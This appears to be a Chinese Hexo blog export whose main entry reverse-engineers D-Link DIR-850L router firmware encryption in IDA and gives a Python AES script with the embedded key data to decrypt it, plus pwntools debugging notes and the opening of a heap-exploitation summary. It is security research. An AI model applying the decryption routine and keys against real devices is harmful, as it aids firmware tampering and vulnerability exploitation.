giidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhccxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnksnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidkasnsnxmzcgdfqtwyerqugiidhcfqtwyerqugiidhcghnkhnrituhtuhgqwsdrcxzfcxgcsfdvefqytnrituhtuhgqwsdrcxzfcxgcsfdvefqytwefqydvfuberhjfbrigncxjkvnodfgjorlnhnkoyjojgsnckasnxmzcgdfqtwyerqugiidhcghnghnkhnrnkhrituhgqwsdrcxzfcxgcsfkasnsnxmzcgdfqtwyerqugiidhc</span><br></pre></td></tr></table></figure>
<p>命令与输出结果 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单线程</span></span><br><span class="line">time ./a.out</span><br><span class="line">1419</span><br><span class="line"></span><br><span class="line">real    0m8.628s</span><br><span class="line">user    0m0.038s</span><br><span class="line">sys     0m0.039s</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">time ./plcs-64</span><br><span class="line">1419</span><br><span class="line">real    0m17.036s</span><br><span class="line">user    0m1.344s</span><br><span class="line">sys     0m0.846s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 2</span><br><span class="line">1419</span><br><span class="line">real    0m14.251s</span><br><span class="line">user    0m1.044s</span><br><span class="line">sys     0m1.093s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 4</span><br><span class="line">1419</span><br><span class="line">real    0m8.603s</span><br><span class="line">user    0m0.842s</span><br><span class="line">sys     0m2.181s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 8</span><br><span class="line">1419</span><br><span class="line">real    0m6.961s</span><br><span class="line">user    0m1.117s</span><br><span class="line">sys     0m4.643s</span><br><span class="line"></span><br><span class="line">time ./plcs-64 16</span><br><span class="line">1418</span><br><span class="line">real    0m6.554s</span><br><span class="line">user    0m1.299s</span><br><span class="line">sys     0m5.947s</span><br></pre></td></tr></table></figure>
<h1 id="lecture-16">Lecture 16</h1>
<ol type="1">
<li><p>经常反思自己做的事情好不好。jyy老师给出的例子是“用cmd替代webpage的gpt，使对话更稳定更易保存”</p></li>
<li><p>计算机的世界里没有什么是我们搞不定的，先从简单的入手，了解原理之后再去接触复杂的（举例是
pmap 是读取 maps 实现的）</p></li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT - 某路由器mips固件解密脚本复现</title>
    <url>/2023/11/09/IOT%20-%20%20%E6%9F%90%E8%B7%AF%E7%94%B1%E5%99%A8mips%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
期中终于结束了😭复现一下b站Wker666的固件解密
</blockquote>
<span id="more"></span>
<blockquote>
<p>第一次分析IOT固件，不当之处请指出😭</p>
</blockquote>
<h1 id="xff-前置知识">0xFF 前置知识</h1>
<ol type="1">
<li><p>多数情况下，路由器固件解包以后我们会拿到一个类似于 Linux
文件系统的文件夹，这个文件系统会跑一些三环程序，而三环程序有非常多的系统调用，因此我们希望通过这些三环程序来提权。</p></li>
<li><p>现在很多厂商会认为，自己的路由器能被解包太不安全了，因此他们会通过加密，但是每次更新换代时，后一代的固件包都是通过前一代的固件中的某个解密算法来解密的。因此，我们在挖掘
IOT
漏洞时，会先找到比较老的一些版本，分析解密算法，进而自己写出解密脚本来解密新一代的固件包。</p></li>
<li><p>(建议看到0x01后再来阅读本条)我们在路由器的 web user
上发送一个更新请求的时候，客户端会先发给服务器一个 http
请求，然后被服务器的 httpd 二进制文件接收，httpd 会 fork
一个新的进程来启用二进制文件 cgibin ，并把环境变量和 http 的请求发给 cgi
， cgi
完成处理以后，把内容输出到标准输出流之类的东西，并返回客户</p></li>
<li><p>IDA 反编译 Mips
文件会有很多“无用操作”，就是两个变量来回赋值之类的，这是由于 Mips
有分支延迟的特性</p></li>
</ol>
<h1 id="x00-准备工作">0x00 准备工作</h1>
<p><img src="https://i0.imgs.ovh/2023/11/09/lto8e.png"
alt="lto8e.png" />
上图中间有这样一句话<code>Upgrade to Firmware V2.10 and then instantly go back into the web user interface and upgrade to Firmware V2.20</code></p>
<p>它告诉我们，从web
user更新到2.2版本时，需要先从官网下载2.1的固件并更新到2.1才行</p>
<p>也就是说，2.2大概率是一个加密固件包，我们无法通过<code>binwalk</code>直接解包，但是2.1可以</p>
<p>我们download两个包到本地binwalk解包一下看看</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltiAU.png" alt="ltiAU.png" />
<figcaption aria-hidden="true">ltiAU.png</figcaption>
</figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/ltjx0.png" alt="ltjx0.png" />
<figcaption aria-hidden="true">ltjx0.png</figcaption>
</figure>
<p>我们可以看到，确实像我们猜想的那样，V2.1未加密，V2.2加密</p>
<h1 id="x01-定位解密逻辑">0x01 定位解密逻辑</h1>
<p>通过 <strong>0xFF.3</strong>
我们知道要分析cgibin和httpd文件，所以我们用IDA打开看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cgibin : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/htdocs</span><br><span class="line"></span><br><span class="line">httpd : /_DIR850LB1_FW210WWb03.bin.extracted/squashfs-root/sbin</span><br></pre></td></tr></table></figure></p>
<p>我们先来分析一下在本文中不那么重要的 httpd 文件，IDA7.6
以上的版本是可以反编译 Mips 的 <img
src="https://i0.imgs.ovh/2023/11/09/l12OW.png" alt="l12OW.png" /> 我们在
function 中搜索
cgi，找到<code>process_cgi</code>函数，如上图，可以看到里面有很多环境变量如<code>GATEWAY_INTERFACE</code>和<code>CONTENT_LENGTH</code>等，在设置完环境变量后，我们可以看到它调用了<code>spawn</code>函数，我们跟进去看一下
<img src="https://i0.imgs.ovh/2023/11/09/l1ZZe.png"
alt="l1ZZe.png" /></p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1lK3.png"
alt="l1lK3.png" /> 可以看到，在 <strong>Line20</strong>
的位置，该进程是被fork起来的，而在 <strong>Line46</strong>
的位置，我们执行了 <code>execve</code> 系统调用，而我们知道 execve
的第一个参数是文件路径，第二个参数是argv，第三个参数是环境变量，因此我们回溯一下</p>
<p>而在调用 <code>spawn</code> 的图中，我们可以看到，spawn
的第一个参数是<code>*v77,v77,ptr</code>,这里的 v77 就是 file_path，而
ptr 就是 env_ptr，我们接着溯源(溯源的时候我们会发现 file_path
的调用处非常少，这是因为 ida 的反编译并没有将 file_path
的数据类型正确处理，导致 file_path 下面的一些变量，其实可能就是
file_path，但因为处理错了，所以被命名为 v78 v79 ...)</p>
<p>如下图，我们挨个分析，而当我们看到 v80 时，可以看到对 v80
被做了手脚，Wker666 说这里是对 cgi 进行一些选择，但我 STFW
以后也没找到原因，先搁置一下吧</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1tB2.png" alt="l1tB2.png" />
<figcaption aria-hidden="true">l1tB2.png</figcaption>
</figure>
<p>至此，httpd
就分析完了，httpd主要是做前端用的，它本身也有一些漏洞，不过这里就不再分析了，我们直接看cgibin</p>
<hr />
<p>我们用 IDA 打开 cgibin 文件，往下找到 seamacgi_main (这里没找到 seama
到底是什么意思，只是因为在 function 中搜索 enc 可以找到 encrypt_main
，溯源分析就能找到 semacgi_main 了) <img
src="https://i0.imgs.ovh/2023/11/09/l111j.png" alt="l111j.png" /></p>
<p>跟进 semacgi_main ,可以找到 encrypt_main
函数，这就是我们需要的解密函数了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1UfV.png" alt="l1UfV.png" />
<figcaption aria-hidden="true">l1UfV.png</figcaption>
</figure>
<h1 id="x02-解密逻辑分析">0x02 解密逻辑分析</h1>
<h3 id="被传入的参数">被传入的参数</h3>
<p>我们查看 encrypt_main 函数的引用，可以在 sub_407664+668
处找到一处调用，我们可以看到第一个参数是6，第二个参数被赋值了很多类似于-i，-d之类的东西，结合
encrypt_main 函数是个 main，我们猜测第一个参数是
argc，第二个参数是argv</p>
<p>但是这里的赋值方式很奇怪，v116
是<code>struct stat</code>，是一个结构体，我们再去别的引用处看一下，可以在
encode_file_check 函数中发现这些参数其实是一个 char 数组，这就符合我们对
argv 的认知了。</p>
<p>我们按 y 键将 sub_407664 中的 v116 的数据类型修改成 char* 即可</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1iQJ.png" alt="l1iQJ.png" />
<figcaption aria-hidden="true">l1iQJ.png</figcaption>
</figure>
<p>接下来分析 argv 都是些什么东西<br />
- 第一个参数: encimg - 第二个参数: -i (将 v116
数据类型修改后，可以很明显的看到"-i"是 v117，而全局变量 ptr 才是 v118) -
第三个参数: ptr(在 encode_file_check 函数中我们可以看到，ptr 与
"/var/firmware.seama"
作了比较，因此我们猜测ptr可能是指向文件名字符串的指针) - 第四个参数: -s
- 第五个参数: byte_43CDB0(在 encode_file_check
函数中我们可以看到，byte_43CDB0 是从 <code>/etc/config/image_sign</code>
文件读出了128个字符，我们去看一下这个文件，发现里面是<code>wrgac25_dlink.2013gui_dir850l</code>)
- 第六个参数: -d</p>
<p>因此，我们传入的参数是<code>encimg -i file -s wrgac25_dlink.2013gui_dir850l -d</code></p>
<p>这也符合 argc = 6 的要求</p>
<h3 id="参数功能">参数功能</h3>
<p>我们知道，一般来说 -h 代表的是 help，所以我们查看一下 encrypt_main
函数的<code>case h:</code>会打印什么东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_408F8C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &#123;OPTIONS&#125;\n&quot;</span>, <span class="string">&quot;encimg&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -h                      : show this message.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -v                      : Verbose mode.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -i &#123;input image file&#125;   : input image file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -e                      : encode file.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   -d                      : decode file.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;   -s                      : signature.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而经过 switch-case 后，在 Line57 判断 dword_43CE40 也就是 signature
是否存在，这个是 -s 参数做的事情，而在 Line59 处判断 file
是否存在，如果两个都通过，就会调用 sub_4090E0 函数，我们继续跟进</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/l1qvD.png" alt="l1qvD.png" />
<figcaption aria-hidden="true">l1qvD.png</figcaption>
</figure>
<p>在 sub_4090E0
函数的前一部分中，做了文件校验等不是很重要的操作，而重要的解密操作从
<strong>Line108</strong> 开始，也就是下图位置，我已经加好注释了</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJCoX.png" alt="lJCoX.png" />
<figcaption aria-hidden="true">lJCoX.png</figcaption>
</figure>
<p>Line130-Line137 是设置AES加解密密钥<code>user_key</code>，而
Line108-Line129
是用<code>_____progs_board_fw_sign_data</code>初始化<code>user_key</code>，接着用
encrypt 函数对<code>user_key</code>做一些处理，我们跟进一下 encrypt
函数</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJP5U.png" alt="lJP5U.png" />
<figcaption aria-hidden="true">lJP5U.png</figcaption>
</figure>
<p>而设置好密钥以后，Line158 处调用 AES_cbc_encrypt
函数(如下图)，但我们通过<a
href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</a>这篇文章知道，AES
不可能只有这么点参数，并且根据分析， v32 和 mmap_file_ptr 都是 mmap_file
，这肯定不对。</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJLr0.png" alt="lJLr0.png" />
<figcaption aria-hidden="true">lJLr0.png</figcaption>
</figure>
<p>所以我们按 y
键，将<code>AES_cbc_encrypt</code>修改为<code>void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,   size_t length, const AES_KEY *key,    unsigned char *ivec, const int enc);</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>： 需要加密/解密的数据；</span><br><span class="line"></span><br><span class="line">out： 计算后输出的数据；</span><br><span class="line"></span><br><span class="line">length： 数据长度（这里不包含初始向量数据长度）</span><br><span class="line"></span><br><span class="line">key：密钥</span><br><span class="line"></span><br><span class="line">ivec： 初始向量（一般为<span class="number">16</span>字节全<span class="number">0</span>）</span><br><span class="line"></span><br><span class="line">enc： <span class="title function_">AES_ENCRYPT</span>(<span class="number">1</span>) 代表加密， <span class="title function_">AES_DECRYPT</span>(<span class="number">0</span>) 代表解密；</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJXIC.png" alt="lJXIC.png" />
<figcaption aria-hidden="true">lJXIC.png</figcaption>
</figure>
<p>现在我们可以看出，Line131-Line177 就是很标准的一个 AES 加解密</p>
<h1 id="解密脚本">解密脚本</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt_file</span>(<span class="params">key,iv,input_file,output_file</span>):</span><br><span class="line">    cipher = AES.new(<span class="built_in">bytes</span>(key),AES.MODE_CBC,<span class="built_in">bytes</span>(iv))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = infile.read(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(chunk) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;aes error&quot;</span>)</span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk)</span><br><span class="line">            outfile.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">______progs_board_fw_sign_data =[<span class="number">0x6B</span>, <span class="number">0x35</span>, <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x57</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x5A</span>, <span class="number">0x36</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x74</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x64</span>, <span class="number">0x55</span>, <span class="number">0x63</span>, <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x2B</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x6E</span>, <span class="number">0x38</span>, <span class="number">0x62</span>, <span class="number">0x4E</span>, <span class="number">0x48</span>, <span class="number">0x5A</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x57</span>, <span class="number">0x43</span>, <span class="number">0x6C</span>, <span class="number">0x39</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x49</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x0A</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x45</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x46</span>, <span class="number">0x76</span>, <span class="number">0x39</span>, <span class="number">0x42</span>, <span class="number">0x4D</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x64</span>, <span class="number">0x4E</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x4C</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_val_by_sig</span>(<span class="params">dec_sig_val,dec_len,sig</span>): <span class="comment"># encrypt 函数 python表示</span></span><br><span class="line">    sig_len = <span class="built_in">len</span>(sig)</span><br><span class="line">    loop_sig_idx = <span class="number">0</span></span><br><span class="line">    loop_dec_idx = <span class="number">1</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cur_sig = sig[loop_sig_idx]</span><br><span class="line">        loop_sig_idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(idx&gt;=dec_len):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(loop_sig_idx&gt;=sig_len):</span><br><span class="line">            loop_sig_idx=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dec_sig_val[idx] = loop_dec_idx ^ dec_sig_val[idx] ^ <span class="built_in">ord</span>(cur_sig)</span><br><span class="line">        loop_dec_idx+=<span class="number">1</span></span><br><span class="line">        idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> loop_dec_idx &gt;= <span class="number">252</span>:</span><br><span class="line">            loop_dec_idx = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">aes_key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    aes_key.append(______progs_board_fw_sign_data[i+<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">iv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    iv.append(______progs_board_fw_sign_data[i+<span class="number">96</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line">dec_val_by_sig(iv,<span class="number">16</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line">dec_val_by_sig(aes_key,<span class="number">32</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line"></span><br><span class="line">aes_decrypt_file(aes_key,iv,<span class="string">&#x27;/mnt/e/EdgeDownload/IOT/DIR850LB1_FW220WWb03.bin&#x27;</span>,<span class="string">&#x27;out.bin&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>解密后即可解包</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJZRR.png" alt="lJZRR.png" />
<figcaption aria-hidden="true">lJZRR.png</figcaption>
</figure>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Mips</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Architecture other than LinuxC</title>
    <url>/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下异架构的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ol type="1">
<li><a href="#1-different-language">Different Language</a>
<ul>
<li><a href="#1-1-python">python</a></li>
</ul></li>
<li><a href="#2-different-architecture">Different Architecture</a>
<ul>
<li><a href="#2-1-arm">ARM</a></li>
</ul></li>
</ol>
<h1 id="different-language">[1] Different Language</h1>
<h2 id="python">[1-1] python</h2>
<h3 id="python-链接-动态链接库">[1-1-1] python 链接 动态链接库</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 main.py 中添加:</span></span><br><span class="line">sys.path.append(<span class="string">&quot;/absolute/path/to/packagename.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line"><span class="comment"># app.cpython-37m-x86_64-linux-gnu.so 中的 37m 指的是 python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packagename</span><br></pre></td></tr></table></figure>
<h3 id="用-pwntools-调试">[1-1-2] 用 pwntools 调试</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;main.py&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h1 id="different-architecture">[2] Different Architecture</h1>
<h2 id="arm">[2-1] ARM</h2>
<p><a href="https://www.cnblogs.com/yidianhan/p/13060466.html">Manual:
ARM/mips系统调用号</a></p>
<h3 id="用-pwntools-调试-1">[2-1-1] 用 pwntools 调试</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后再开一个tmux</span></span><br><span class="line"><span class="comment"># 用 gdb-multiarch ./pwn</span></span><br><span class="line"><span class="comment"># 在 gdb 中输入 target remote:1234</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Heap Exploit Summary</title>
    <url>/2024/02/07/Pwn%20-%20Heap%20Exploit%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下 Heap 的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<p><a href="https://github.com/iromise/glibc/tree/master/malloc">Github:
ptmalloc 源码(只有 malloc 部分)</a></p>
<p><a href="https://www.jianshu.com/p/1a966b62b3d4">source code
compilation &amp;&amp; all libc debs</a></p>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><a href="#1-patchelf的使用方式">Patchelf的使用方式</a></li>
<li><a href="#2-详解-申请与释放-chunk未完成">详解 '申请与释放
chunk'</a></li>
<li><a href="#3-chunk-extend-and-overlapping">chunk Extend and
Overlapping</a></li>
<li><a href="#4-use-after-free">Use After Free</a></li>
<li><a href="#5-double-free">Double Free</a></li>
<li><a href="#6-unlink">Unlink</a></li>
<li><a href="#7-series-of-bin">Series of Bin</a>
<ul>
<li><a href="#7-1-tcachebin">7-1 Tcachebin</a></li>
<li><a href="#7-2-fastbin">7-2 Fastbin</a></li>
<li><a href="#7-3-unsortedbin">7-3 Unsortedbin</a></li>
<li><a href="#7-4-largebin-attack">7-4 Largebin Attack</a></li>
</ul></li>
<li><a href="#8-series-of-house">Series of House</a>
<ul>
<li><a href="#8-1-house-of-orange">8-1 House of Orange</a></li>
<li><a href="#8-2-house-of-force-hof">8-2 House of Force</a></li>
<li><a href="#8-3-house-of-botcake">8-3 House of botcake</a></li>
<li><a href="#8-4-house-of-banana">8-4 House of banana</a></li>
<li><a href="#8-5-house-of-pig">8-5 House of pig</a></li>
</ul></li>
</ol>
<h1 id="patchelf的使用方式">[1] Patchelf的使用方式</h1>
<blockquote>
<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
heap，因此我们需要将本地的 elf 文件的链接部分 patch
一下，使其与远程链接的 libc 文件保持一致。</p>
</blockquote>
<h2 id="确认libc">[1-1] 确认libc</h2>
<blockquote>
<p>有时题目只给一个 libc.so.6，此时 patchelf 后程序会因为缺少 ld
文件而无法正常运行，因此我们需要通过这个 libc.so.6 来确认程序使用的 libc
版本，然后自己下载对应 libc 包并 patch</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_offset = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_offset      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_offset     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(read_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_offset   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(printf_offset))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_offset     ---&gt;    0x84420</span></span><br><span class="line"><span class="string">read_offset     ---&gt;    0x10dfc0</span></span><br><span class="line"><span class="string">printf_offset   ---&gt;    0x61c90</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># puts    ---&gt;    420</span></span><br><span class="line"><span class="string"># read    ---&gt;    fc0</span></span><br><span class="line"><span class="string"># printf  ---&gt;    c90</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将打印出来的三个偏移量的后三位，拿到 <a
href="https://libc.blukat.me/?q=puts%3A420%2Cread%3Afc0%2Cprintf%3Ac90">libcSearcher</a>
去查即可</p>
<h2 id="libc-包的下载">[1-2] libc 包的下载</h2>
<p>patchelf没有的包可以在<a
href="https://www.jianshu.com/p/1a966b62b3d4">这里</a>下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有时我们需要的 libc 包不在 list
中，我们可以自己尝试解构命令来下载。</p>
</blockquote>
